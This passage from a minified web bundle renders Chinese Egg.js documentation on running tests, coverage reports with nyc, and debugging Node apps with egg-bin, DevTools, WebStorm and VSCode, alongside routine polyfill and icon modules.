",r.a.createElement(l["Link"],{to:"https://www.npmjs.com/package/glob"},"glob")," \u89c4\u5219\u3002"),r.a.createElement("h3",{id:"\u6307\u5b9a-reporter"},r.a.createElement(l["AnchorLink"],{to:"#\u6307\u5b9a-reporter","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6307\u5b9a reporter"),r.a.createElement("p",null,"Mocha \u652f\u6301\u591a\u79cd\u5f62\u5f0f\u7684 reporter\uff0c\u9ed8\u8ba4\u4f7f\u7528 ",r.a.createElement("code",null,"spec")," reporter\u3002"),r.a.createElement("p",null,"\u53ef\u4ee5\u624b\u52a8\u8bbe\u7f6e ",r.a.createElement("code",null,"TEST_REPORTER")," \u73af\u5883\u53d8\u91cf\u6765\u6307\u5b9a reporter\uff0c\u4f8b\u5982\u4f7f\u7528 ",r.a.createElement("code",null,"dot"),"\uff1a"),r.a.createElement(o["a"],{code:"$ TEST_REPORTER=dot npm test",lang:"bash"}),r.a.createElement("p",null,r.a.createElement("img",{src:"https://cloud.githubusercontent.com/assets/156269/21849809/a6fe6df8-d842-11e6-8507-20da63bc8b62.png",alt:"image"})),r.a.createElement("h3",{id:"\u6307\u5b9a\u7528\u4f8b\u8d85\u65f6\u65f6\u95f4"},r.a.createElement(l["AnchorLink"],{to:"#\u6307\u5b9a\u7528\u4f8b\u8d85\u65f6\u65f6\u95f4","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6307\u5b9a\u7528\u4f8b\u8d85\u65f6\u65f6\u95f4"),r.a.createElement("p",null,"\u9ed8\u8ba4\u6267\u884c\u8d85\u65f6\u65f6\u95f4\u4e3a 30 \u79d2\u3002\u6211\u4eec\u4e5f\u53ef\u4ee5\u624b\u52a8\u6307\u5b9a\u8d85\u65f6\u65f6\u95f4\uff08\u5355\u4f4d\u6beb\u79d2\uff09\uff0c\u4f8b\u5982\u8bbe\u7f6e\u4e3a 5 \u79d2\uff1a"),r.a.createElement(o["a"],{code:"$ TEST_TIMEOUT=5000 npm test",lang:"bash"}),r.a.createElement("h3",{id:"\u901a\u8fc7-argv-\u65b9\u5f0f\u4f20\u53c2"},r.a.createElement(l["AnchorLink"],{to:"#\u901a\u8fc7-argv-\u65b9\u5f0f\u4f20\u53c2","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u901a\u8fc7 argv \u65b9\u5f0f\u4f20\u53c2"),r.a.createElement("p",null,r.a.createElement("code",null,"egg-bin test")," \u9664\u4e86\u73af\u5883\u53d8\u91cf\u65b9\u5f0f\uff0c\u4e5f\u652f\u6301\u76f4\u63a5\u4f20\u53c2\uff0c\u652f\u6301 mocha \u7684\u6240\u6709\u53c2\u6570\uff0c\u53c2\u89c1\uff1a",r.a.createElement(l["Link"],{to:"https://mochajs.org/#usage"},"mocha usage")," \u3002"),r.a.createElement(o["a"],{code:'$ # npm \u4f20\u9012\u53c2\u6570\u9700\u989d\u5916\u52a0\u4e00\u4e2a `--`\uff0c\u53c2\u89c1 https://docs.npmjs.com/cli/run-script\n$ npm test -- --help\n$\n$ # \u7b49\u540c\u4e8e `TESTS=test/**/test.js npm test`\uff0c\u53d7\u9650\u4e8e bash\uff0c\u6700\u597d\u52a0\u4e0a\u53cc\u5f15\u53f7\n$ npm test "test/**/test.js"\n$\n$ # \u7b49\u540c\u4e8e `TEST_REPORTER=dot npm test`\n$ npm test -- --reporter=dot\n$\n$ # \u652f\u6301 mocha \u7684\u53c2\u6570\uff0c\u5982 grep / require \u7b49\n$ npm test -- -t 30000 --grep="should GET"',lang:"bash"}),r.a.createElement("h2",{id:"\u4ee3\u7801\u8986\u76d6\u7387"},r.a.createElement(l["AnchorLink"],{to:"#\u4ee3\u7801\u8986\u76d6\u7387","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4ee3\u7801\u8986\u76d6\u7387"),r.a.createElement("p",null,"egg-bin \u5df2\u7ecf\u5185\u7f6e\u4e86 ",r.a.createElement(l["Link"],{to:"https://github.com/istanbuljs/nyc"},"nyc")," \u6765\u652f\u6301\u5355\u5143\u6d4b\u8bd5\u81ea\u52a8\u751f\u6210\u4ee3\u7801\u8986\u76d6\u7387\u62a5\u544a\u3002"),r.a.createElement("p",null,"\u6dfb\u52a0 ",r.a.createElement("code",null,"npm scripts")," \u5230 ",r.a.createElement("code",null,"package.json"),"\uff1a"),r.a.createElement(o["a"],{code:'{\n  "scripts": {\n    "cov": "egg-bin cov"\n  }\n}',lang:"json"}),r.a.createElement("p",null,"\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"npm run cov")," \u547d\u4ee4\u8fd0\u884c\u5355\u5143\u6d4b\u8bd5\u8986\u76d6\u7387\u3002"),r.a.createElement(o["a"],{code:"$ egg-bin cov\n\n  test/controller/home.test.js\n    GET /\n      \u2713 should status 200 and get the body\n    POST /post\n      \u2713 should status 200 and get the request body\n\n  ...\n\n  16 passing (1s)\n\n=============================== Coverage summary ===============================\nStatements   : 100% ( 41/41 )\nBranches     : 87.5% ( 7/8 )\nFunctions    : 100% ( 10/10 )\nLines        : 100% ( 41/41 )\n================================================================================",lang:"bash"}),r.a.createElement("p",null,"\u8fd8\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"open coverage/lcov-report/index.html")," \u6253\u5f00\u5b8c\u6574\u7684 HTML \u8986\u76d6\u7387\u62a5\u544a\u3002"),r.a.createElement("p",null,r.a.createElement("img",{src:"https://cloud.githubusercontent.com/assets/156269/21845201/a9a85ab6-d82c-11e6-8c24-5e85f352be4a.png",alt:"image"})),r.a.createElement("h3",{id:"\u73af\u5883\u914d\u7f6e-2"},r.a.createElement(l["AnchorLink"],{to:"#\u73af\u5883\u914d\u7f6e-2","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u73af\u5883\u914d\u7f6e"),r.a.createElement("p",null,"\u548c ",r.a.createElement("code",null,"test")," \u547d\u4ee4\u4e00\u6837\uff0c",r.a.createElement("code",null,"cov")," \u547d\u4ee4\u6267\u884c\u65f6\uff0c\u5e94\u7528\u4e5f\u662f\u4ee5 ",r.a.createElement("code",null,"env: unittest")," \u542f\u52a8\u7684\uff0c\u8bfb\u53d6\u7684\u914d\u7f6e\u4e5f\u662f ",r.a.createElement("code",null,"config.default.js")," \u548c ",r.a.createElement("code",null,"config.unittest.js")," \u5408\u5e76\u7684\u7ed3\u679c\u3002"),r.a.createElement("h3",{id:"\u5ffd\u7565\u6307\u5b9a\u6587\u4ef6"},r.a.createElement(l["AnchorLink"],{to:"#\u5ffd\u7565\u6307\u5b9a\u6587\u4ef6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5ffd\u7565\u6307\u5b9a\u6587\u4ef6"),r.a.createElement("p",null,"\u5bf9\u4e8e\u67d0\u4e9b\u4e0d\u9700\u8981\u8dd1\u6d4b\u8bd5\u8986\u76d6\u7387\u7684\u6587\u4ef6\uff0c\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"COV_EXCLUDES")," \u73af\u5883\u53d8\u91cf\u6307\u5b9a\uff1a"),r.a.createElement(o["a"],{code:"$ COV_EXCLUDES=app/plugins/c* npm run cov\n$ # \u6216\u8005\u4f20\u53c2\u65b9\u5f0f\n$ npm run cov -- --x=app/plugins/c*",lang:"bash"}),r.a.createElement("h2",{id:"\u8c03\u8bd5"},r.a.createElement(l["AnchorLink"],{to:"#\u8c03\u8bd5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u8c03\u8bd5"),r.a.createElement("h3",{id:"\u65e5\u5fd7\u8f93\u51fa"},r.a.createElement(l["AnchorLink"],{to:"#\u65e5\u5fd7\u8f93\u51fa","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u65e5\u5fd7\u8f93\u51fa"),r.a.createElement("h3",{id:"\u4f7f\u7528-logger-\u6a21\u5757"},r.a.createElement(l["AnchorLink"],{to:"#\u4f7f\u7528-logger-\u6a21\u5757","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4f7f\u7528 logger \u6a21\u5757"),r.a.createElement("p",null,"\u6846\u67b6\u5185\u7f6e\u4e86",r.a.createElement(l["Link"],{to:"./logger"},"\u65e5\u5fd7")," \u529f\u80fd\uff0c\u4f7f\u7528 ",r.a.createElement("code",null,"logger.debug()")," \u8f93\u51fa\u8c03\u8bd5\u4fe1\u606f\uff0c",r.a.createElement("strong",null,"\u63a8\u8350\u5728\u5e94\u7528\u4ee3\u7801\u4e2d\u4f7f\u7528\u5b83\u3002")),r.a.createElement(o["a"],{code:"// controller\nthis.logger.debug('current user: %j', this.user);\n\n// service\nthis.ctx.logger.debug('debug info from service');\n\n// app/init.js\napp.logger.debug('app init');",lang:"js"}),r.a.createElement("p",null,"\u901a\u8fc7 ",r.a.createElement("code",null,"config.logger.level")," \u6765\u914d\u7f6e\u6253\u5370\u5230\u6587\u4ef6\u7684\u65e5\u5fd7\u7ea7\u522b\uff0c\u901a\u8fc7 ",r.a.createElement("code",null,"config.logger.consoleLevel")," \u914d\u7f6e\u6253\u5370\u5230\u7ec8\u7aef\u7684\u65e5\u5fd7\u7ea7\u522b\u3002"),r.a.createElement("h3",{id:"\u4f7f\u7528-debug-\u6a21\u5757"},r.a.createElement(l["AnchorLink"],{to:"#\u4f7f\u7528-debug-\u6a21\u5757","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4f7f\u7528 debug \u6a21\u5757"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://www.npmjs.com/package/debug"},"debug")," \u6a21\u5757\u662f Node.js \u793e\u533a\u5e7f\u6cdb\u4f7f\u7528\u7684 debug \u5de5\u5177\uff0c\u5f88\u591a\u6a21\u5757\u90fd\u4f7f\u7528\u5b83\u6a21\u5757\u6253\u5370\u8c03\u8bd5\u4fe1\u606f\uff0cEgg \u793e\u533a\u4e5f\u5e7f\u6cdb\u91c7\u7528\u8fd9\u4e00\u673a\u5236\u6253\u5370 debug \u4fe1\u606f\uff0c",r.a.createElement("strong",null,"\u63a8\u8350\u5728\u6846\u67b6\u548c\u63d2\u4ef6\u5f00\u53d1\u4e2d\u4f7f\u7528\u5b83\u3002")),r.a.createElement("p",null,"\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"DEBUG")," \u73af\u5883\u53d8\u91cf\u9009\u62e9\u5f00\u542f\u6307\u5b9a\u7684\u8c03\u8bd5\u4ee3\u7801\uff0c\u65b9\u4fbf\u89c2\u6d4b\u6267\u884c\u8fc7\u7a0b\u3002"),r.a.createElement("p",null,"\uff08\u8c03\u8bd5\u6a21\u5757\u548c\u65e5\u5fd7\u6a21\u5757\u4e0d\u8981\u6df7\u6dc6\uff0c\u800c\u4e14\u65e5\u5fd7\u6a21\u5757\u4e5f\u6709\u5f88\u591a\u529f\u80fd\uff0c\u8fd9\u91cc\u6240\u8bf4\u7684\u65e5\u5fd7\u90fd\u662f\u8c03\u8bd5\u4fe1\u606f\u3002\uff09"),r.a.createElement("p",null,"\u5f00\u542f\u6240\u6709\u6a21\u5757\u7684\u65e5\u5fd7\uff1a"),r.a.createElement(o["a"],{code:"$ DEBUG=* npm run dev",lang:"bash"}),r.a.createElement("p",null,"\u5f00\u542f\u6307\u5b9a\u6a21\u5757\u7684\u65e5\u5fd7\uff1a"),r.a.createElement(o["a"],{code:"$ DEBUG=egg* npm run dev",lang:"bash"}),r.a.createElement("p",null,"\u5355\u5143\u6d4b\u8bd5\u4e5f\u53ef\u4ee5\u7528 ",r.a.createElement("code",null,"DEBUG=* npm test")," \u6765\u67e5\u770b\u6d4b\u8bd5\u7528\u4f8b\u8fd0\u884c\u7684\u8be6\u7ec6\u65e5\u5fd7\u3002"),r.a.createElement("h3",{id:"\u4f7f\u7528-egg-bin-\u8c03\u8bd5"},r.a.createElement(l["AnchorLink"],{to:"#\u4f7f\u7528-egg-bin-\u8c03\u8bd5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4f7f\u7528 egg-bin \u8c03\u8bd5"),r.a.createElement("h4",{id:"\u6dfb\u52a0\u547d\u4ee4-2"},r.a.createElement(l["AnchorLink"],{to:"#\u6dfb\u52a0\u547d\u4ee4-2","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6dfb\u52a0\u547d\u4ee4"),r.a.createElement("p",null,"\u6dfb\u52a0 ",r.a.createElement("code",null,"npm scripts")," \u5230 ",r.a.createElement("code",null,"package.json"),"\uff1a"),r.a.createElement(o["a"],{code:'{\n  "scripts": {\n    "debug": "egg-bin debug"\n  }\n}',lang:"json"}),r.a.createElement("p",null,"\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"npm run debug")," \u547d\u4ee4\u6765\u65ad\u70b9\u8c03\u8bd5\u5e94\u7528\u3002"),r.a.createElement("p",null,r.a.createElement("code",null,"egg-bin")," \u4f1a\u667a\u80fd\u9009\u62e9\u8c03\u8bd5\u534f\u8bae\uff0c\u5728 8.x \u4e4b\u540e\u7248\u672c\u4f7f\u7528 ",r.a.createElement(l["Link"],{to:"https://chromedevtools.github.io/debugger-protocol-viewer/v8"},"Inspector Protocol")," \u534f\u8bae\uff0c\u4f4e\u7248\u672c\u4f7f\u7528 ",r.a.createElement(l["Link"],{to:"https://github.com/buggerjs/bugger-v8-client/blob/master/PROTOCOL.md"},"Legacy Protocol"),"\u3002"),r.a.createElement("p",null,"\u540c\u65f6\u4e5f\u652f\u6301\u81ea\u5b9a\u4e49\u8c03\u8bd5\u53c2\u6570\uff1a"),r.a.createElement(o["a"],{code:"$ egg-bin debug --inpsect=9229",lang:"bash"}),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"master")," \u8c03\u8bd5\u7aef\u53e3\u4e3a 9229 \u6216 5858\uff08\u65e7\u534f\u8bae\uff09"),r.a.createElement("li",null,r.a.createElement("code",null,"agent")," \u8c03\u8bd5\u7aef\u53e3\u56fa\u5b9a\u4e3a 5800\uff0c\u53ef\u4ee5\u4f20\u9012 ",r.a.createElement("code",null,"process.env.EGG_AGENT_DEBUG_PORT")," \u6765\u81ea\u5b9a\u4e49\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"worker")," \u8c03\u8bd5\u7aef\u53e3\u4e3a ",r.a.createElement("code",null,"master")," \u8c03\u8bd5\u7aef\u53e3\u9012\u589e\u3002"),r.a.createElement("li",null,"\u5f00\u53d1\u9636\u6bb5 worker \u5728\u4ee3\u7801\u4fee\u6539\u540e\u4f1a\u70ed\u91cd\u542f\uff0c\u5bfc\u81f4\u8c03\u8bd5\u7aef\u53e3\u4f1a\u81ea\u589e\uff0c\u53c2\u89c1\u4e0b\u6587\u7684 IDE \u914d\u7f6e\u4ee5\u4fbf\u81ea\u52a8\u91cd\u8fde\u3002")),r.a.createElement("h4",{id:"\u73af\u5883\u914d\u7f6e-3"},r.a.createElement(l["AnchorLink"],{to:"#\u73af\u5883\u914d\u7f6e-3","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u73af\u5883\u914d\u7f6e"),r.a.createElement("p",null,"\u6267\u884c ",r.a.createElement("code",null,"debug")," \u547d\u4ee4\u65f6\uff0c\u5e94\u7528\u4e5f\u662f\u4ee5 ",r.a.createElement("code",null,"env: local")," \u542f\u52a8\u7684\uff0c\u8bfb\u53d6\u7684\u914d\u7f6e\u662f ",r.a.createElement("code",null,"config.default.js")," \u548c ",r.a.createElement("code",null,"config.local.js")," \u5408\u5e76\u7684\u7ed3\u679c\u3002"),r.a.createElement("h4",{id:"\u4f7f\u7528-devtools-\u8fdb\u884c\u8c03\u8bd5"},r.a.createElement(l["AnchorLink"],{to:"#\u4f7f\u7528-devtools-\u8fdb\u884c\u8c03\u8bd5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4f7f\u7528 ",r.a.createElement(l["Link"],{to:"https://developer.chrome.com/devtools"},"DevTools")," \u8fdb\u884c\u8c03\u8bd5"),r.a.createElement("p",null,"\u6700\u65b0\u7684 DevTools \u53ea\u652f\u6301 ",r.a.createElement(l["Link"],{to:"https://chromedevtools.github.io/debugger-protocol-viewer/v8"},"Inspector Protocol")," \u534f\u8bae\uff0c\u6545\u4f60\u9700\u8981\u4f7f\u7528 Node.js 8.x+ \u7684\u7248\u672c\u65b9\u80fd\u4f7f\u7528\u3002"),r.a.createElement("p",null,"\u6267\u884c ",r.a.createElement("code",null,"npm run debug")," \u542f\u52a8\uff1a"),r.a.createElement(o["a"],{code:"\u279c  showcase git:(master) \u2717 npm run debug\n\n> showcase@1.0.0 debug /Users/tz/Workspaces/eggjs/test/showcase\n> egg-bin debug\n\nDebugger listening on ws://127.0.0.1:9229/f8258ca6-d5ac-467d-bbb1-03f59bcce85b\nFor help see https://nodejs.org/en/docs/inspector\n2017-09-14 16:01:35,990 INFO 39940 [master] egg version 1.8.0\nDebugger listening on ws://127.0.0.1:5800/bfe1bf6a-2be5-4568-ac7d-69935e0867fa\nFor help see https://nodejs.org/en/docs/inspector\n2017-09-14 16:01:36,432 INFO 39940 [master] agent_worker#1:39941 started (434ms)\nDebugger listening on ws://127.0.0.1:9230/2fcf4208-4571-4968-9da0-0863ab9f98ae\nFor help see https://nodejs.org/en/docs/inspector\n9230 opened\nDebug Proxy online, now you could attach to 9999 without worry about reload.\nDevTools \u2192 chrome-devtools://devtools/bundled/inspector.html?experiments=true&v8only=true&ws=127.0.0.1:9999/__ws_proxy__",lang:"bash"}),r.a.createElement("p",null,"\u7136\u540e\u9009\u62e9\u4ee5\u4e0b\u4e00\u79cd\u65b9\u5f0f\u5373\u53ef\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u76f4\u63a5\u8bbf\u95ee\u63a7\u5236\u53f0\u6700\u540e\u8f93\u51fa\u7684 ",r.a.createElement("code",null,"DevTools")," \u5730\u5740\uff0c\u8be5\u5730\u5740\u662f\u4ee3\u7406\u540e\u7684 worker\uff0c\u65e0\u9700\u62c5\u5fc3\u91cd\u542f\u95ee\u9898\u3002"),r.a.createElement("li",null,"\u8bbf\u95ee ",r.a.createElement("code",null,"chrome://inspect"),"\uff0c\u914d\u7f6e\u5bf9\u5e94\u7684\u7aef\u53e3\uff0c\u7136\u540e\u70b9\u51fb ",r.a.createElement("code",null,"Open dedicated DevTools for Node")," \u5373\u53ef\u6253\u5f00\u8c03\u8bd5\u63a7\u5236\u53f0\u3002")),r.a.createElement("p",null,r.a.createElement("img",{src:"https://user-images.githubusercontent.com/227713/30419047-a54ac592-9967-11e7-8a05-5dbb82088487.png",alt:"DevTools"})),r.a.createElement("h4",{id:"\u4f7f\u7528-webstorm-\u8fdb\u884c\u8c03\u8bd5"},r.a.createElement(l["AnchorLink"],{to:"#\u4f7f\u7528-webstorm-\u8fdb\u884c\u8c03\u8bd5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4f7f\u7528 WebStorm \u8fdb\u884c\u8c03\u8bd5"),r.a.createElement("p",null,r.a.createElement("code",null,"egg-bin")," \u4f1a\u81ea\u52a8\u8bfb\u53d6 WebStorm \u8c03\u8bd5\u6a21\u5f0f\u4e0b\u8bbe\u7f6e\u7684\u73af\u5883\u53d8\u91cf ",r.a.createElement("code",null,"$NODE_DEBUG_OPTION"),"\u3002"),r.a.createElement("p",null,"\u4f7f\u7528 WebStorm \u7684 npm \u8c03\u8bd5\u542f\u52a8\u5373\u53ef\uff1a"),r.a.createElement("p",null,r.a.createElement("img",{src:"https://user-images.githubusercontent.com/227713/30423086-5dd32ac6-9974-11e7-840f-904e49a97694.png",alt:"WebStorm"})),r.a.createElement("h4",{id:"\u4f7f\u7528-vscode-\u8fdb\u884c\u8c03\u8bd5"},r.a.createElement(l["AnchorLink"],{to:"#\u4f7f\u7528-vscode-\u8fdb\u884c\u8c03\u8bd5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4f7f\u7528 ",r.a.createElement(l["Link"],{to:"https://code.visualstudio.com/"},"VSCode")," \u8fdb\u884c\u8c03\u8bd5"),r.a.createElement("p",null,"\u53ef\u4ee5\u901a\u8fc7 2 \u4e2a\u65b9\u5f0f\uff1a"),r.a.createElement("p",null,"\u65b9\u5f0f\u4e00\uff1a\u5f00\u542f VSCode \u914d\u7f6e ",r.a.createElement("code",null,"Debug: Toggle Auto Attach"),"\uff0c\u7136\u540e\u5728 Terminal \u6267\u884c ",r.a.createElement("code",null,"npm run debug")," \u5373\u53ef\u3002"),r.a.createElement("p",null,"\u65b9\u5f0f\u4e8c\uff1a\u914d\u7f6e VSCode \u7684 ",r.a.createElement("code",null,".vscode/launch.json"),"\uff0c\u7136\u540e F5 \u4e00\u952e\u542f\u52a8\u5373\u53ef\u3002\uff08\u6ce8\u610f\uff0c\u9700\u8981\u5173\u95ed\u65b9\u5f0f\u4e00\u4e2d\u7684\u914d\u7f6e\uff09"),r.a.createElement(o["a"],{code:'// .vscode/launch.json\n{\n  "version": "0.2.0",\n  "configurations": [\n    {\n      "name": "Launch Egg",\n      "type": "node",\n      "request": "launch",\n      "cwd": "${workspaceRoot}",\n      "runtimeExecutable": "npm",\n      "windows": { "runtimeExecutable": "npm.cmd" },\n      "runtimeArgs": [ "run", "debug" ],\n      "console": "integratedTerminal",\n      "protocol": "auto",\n      "restart": true,\n      "port": 9229,\n      "autoAttachChildProcesses": true\n    }\n  ]\n}',lang:"js"}),r.a.createElement("p",null,"\u6211\u4eec\u4e5f\u63d0\u4f9b\u4e86\u4e00\u4e2a ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/vscode-eggjs"},"vscode-eggjs")," \u6269\u5c55\u6765\u81ea\u52a8\u751f\u6210\u914d\u7f6e\u3002"),r.a.createElement("p",null,r.a.createElement("img",{src:"https://user-images.githubusercontent.com/227713/35954428-7f8768ee-0cc4-11e8-90b2-67e623594fa1.png",alt:"VSCode"})),r.a.createElement("p",null,"\u66f4\u591a VSCode Debug \u7528\u6cd5\u53ef\u4ee5\u53c2\u89c1\u6587\u6863: ",r.a.createElement(l["Link"],{to:"https://code.visualstudio.com/docs/nodejs/nodejs-debugging"},"Node.js Debugging in VS Code")),r.a.createElement("h2",{id:"\u66f4\u591a"},r.a.createElement(l["AnchorLink"],{to:"#\u66f4\u591a","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u66f4\u591a"),r.a.createElement("p",null,"\u5982\u679c\u60f3\u4e86\u89e3\u66f4\u591a\u672c\u5730\u5f00\u53d1\u76f8\u5173\u7684\u5185\u5bb9\uff0c\u4f8b\u5982\u4e3a\u4f60\u7684\u56e2\u961f\u5b9a\u5236\u4e00\u4e2a\u672c\u5730\u5f00\u53d1\u5de5\u5177\uff0c\u8bf7\u53c2\u8003 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-bin"},"egg-bin"),"\u3002")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},"4sdT":function(e,t,n){var a=n("0mt+"),r=n("A0UU"),l=n("HvYB"),o=!r.setImmediate||!r.clearImmediate;a({global:!0,bind:!0,enumerable:!0,forced:o},{setImmediate:l.set,clearImmediate:l.clear})},"55D7":function(e,t,n){"use strict";var a=n("3Qq0"),r=n("FU0I"),l={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M563.8 512l262.5-312.9c4.4-5.2.7-13.1-6.1-13.1h-79.8c-4.7 0-9.2 2.1-12.3 5.7L511.6 449.8 295.1 191.7c-3-3.6-7.5-5.7-12.3-5.7H203c-6.8 0-10.5 7.9-6.1 13.1L459.4 512 196.9 824.9A7.95 7.95 0 00203 838h79.8c4.7 0 9.2-2.1 12.3-5.7l216.5-258.1 216.5 258.1c3 3.6 7.5 5.7 12.3 5.7h79.8c6.8 0 10.5-7.9 6.1-13.1L563.8 512z"}}]},name:"close",theme:"outlined"},o=l,i=n("Il1s"),c=function(e,t){return r["createElement"](i["a"],Object(a["a"])(Object(a["a"])({},e),{},{ref:t,icon:o}))};c.displayName="CloseOutlined";t["a"]=r["forwardRef"](c)},"5FRT":function(e,t,n){"use strict";var a=n("AcHn"),r=n("SCbZ"),l=n("N0Us"),o=n("xxe1"),i=n("hOjR"),c=Math.min,s=[].lastIndexOf,u=!!s&&1/[1].lastIndexOf(1,-0)<0,d=o("lastIndexOf"),m=i("indexOf",{ACCESSORS:!0,1:0}),p=u||!d||!m;e.exports=p?function(e){if(u)return s.apply(this,arguments)||0;var t=a(this),n=l(t.length),o=n-1;for(arguments.length>1&&(o=c(o,r(arguments[1]))),o<0&&(o=n+o);o>=0;o--)if(o in t&&t[o]===e)return o||0;return-1}:s},"5OIK":function(e,t,n){var a=n("A0UU"),r=n("2g9I"),l=n("69j1"),o=n("XExY"),i=n("q7Pv"),c=i("iterator"),s=i("toStringTag"),u=l.values;for(var d in r){var m=a[d],p=m&&m.prototype;if(p){if(p[c]!==u)try{o(p,c,u)}catch(g){p[c]=u}if(p[s]||o(p,s,d),r[d])for(var h in l)if(p[h]!==l[h])try{o(p,h,l[h])}catch(g){p[h]=l[h]}}}},"5g1I":function(e,t,n){"use strict";var a=n("ra1n"),r=n("oyD1"),l=n("tS9j"),o=n("VfHC"),i=n("JAZO");a("search",1,(function(e,t,n){return[function(t){var n=l(this),a=void 0==t?void 0:t[e];return void 0!==a?a.call(t,n):new RegExp(t)[e](String(n))},function(e){var a=n(t,e,this);if(a.done)return a.value;var l=r(e),c=String(this),s=l.lastIndex;o(s,0)||(l.lastIndex=0);var u=i(l,c);return o(l.lastIndex,s)||(l.lastIndex=s),null===u?-1:u.index}]}))},"5pkK":function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("h2",{id:"\u4ec0\u4e48\u662f-controller"},r.a.createElement(l["AnchorLink"],{to:"#\u4ec0\u4e48\u662f-controller","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4ec0\u4e48\u662f Controller"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"./router"},"\u524d\u9762\u7ae0\u8282"),"\u5199\u5230\uff0c\u6211\u4eec\u901a\u8fc7 Router \u5c06\u7528\u6237\u7684\u8bf7\u6c42\u57fa\u4e8e method \u548c URL \u5206\u53d1\u5230\u4e86\u5bf9\u5e94\u7684 Controller \u4e0a\uff0c\u90a3 Controller \u8d1f\u8d23\u505a\u4ec0\u4e48\uff1f"),r.a.createElement("p",null,"\u7b80\u5355\u7684\u8bf4 Controller \u8d1f\u8d23",r.a.createElement("strong",null,"\u89e3\u6790\u7528\u6237\u7684\u8f93\u5165\uff0c\u5904\u7406\u540e\u8fd4\u56de\u76f8\u5e94\u7684\u7ed3\u679c"),"\uff0c\u4f8b\u5982"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5728 ",r.a.createElement(l["Link"],{to:"https://en.wikipedia.org/wiki/Representational_state_transfer"},"RESTful")," \u63a5\u53e3\u4e2d\uff0cController \u63a5\u53d7\u7528\u6237\u7684\u53c2\u6570\uff0c\u4ece\u6570\u636e\u5e93\u4e2d\u67e5\u627e\u5185\u5bb9\u8fd4\u56de\u7ed9\u7528\u6237\u6216\u8005\u5c06\u7528\u6237\u7684\u8bf7\u6c42\u66f4\u65b0\u5230\u6570\u636e\u5e93\u4e2d\u3002"),r.a.createElement("li",null,"\u5728 HTML \u9875\u9762\u8bf7\u6c42\u4e2d\uff0cController \u6839\u636e\u7528\u6237\u8bbf\u95ee\u4e0d\u540c\u7684 URL\uff0c\u6e32\u67d3\u4e0d\u540c\u7684\u6a21\u677f\u5f97\u5230 HTML \u8fd4\u56de\u7ed9\u7528\u6237\u3002"),r.a.createElement("li",null,"\u5728\u4ee3\u7406\u670d\u52a1\u5668\u4e2d\uff0cController \u5c06\u7528\u6237\u7684\u8bf7\u6c42\u8f6c\u53d1\u5230\u5176\u4ed6\u670d\u52a1\u5668\u4e0a\uff0c\u5e76\u5c06\u5176\u4ed6\u670d\u52a1\u5668\u7684\u5904\u7406\u7ed3\u679c\u8fd4\u56de\u7ed9\u7528\u6237\u3002")),r.a.createElement("p",null,"\u6846\u67b6\u63a8\u8350 Controller \u5c42\u4e3b\u8981\u5bf9\u7528\u6237\u7684\u8bf7\u6c42\u53c2\u6570\u8fdb\u884c\u5904\u7406\uff08\u6821\u9a8c\u3001\u8f6c\u6362\uff09\uff0c\u7136\u540e\u8c03\u7528\u5bf9\u5e94\u7684 ",r.a.createElement(l["Link"],{to:"./service"},"service")," \u65b9\u6cd5\u5904\u7406\u4e1a\u52a1\uff0c\u5f97\u5230\u4e1a\u52a1\u7ed3\u679c\u540e\u5c01\u88c5\u5e76\u8fd4\u56de\uff1a"),r.a.createElement("ol",null,r.a.createElement("li",null,"\u83b7\u53d6\u7528\u6237\u901a\u8fc7 HTTP 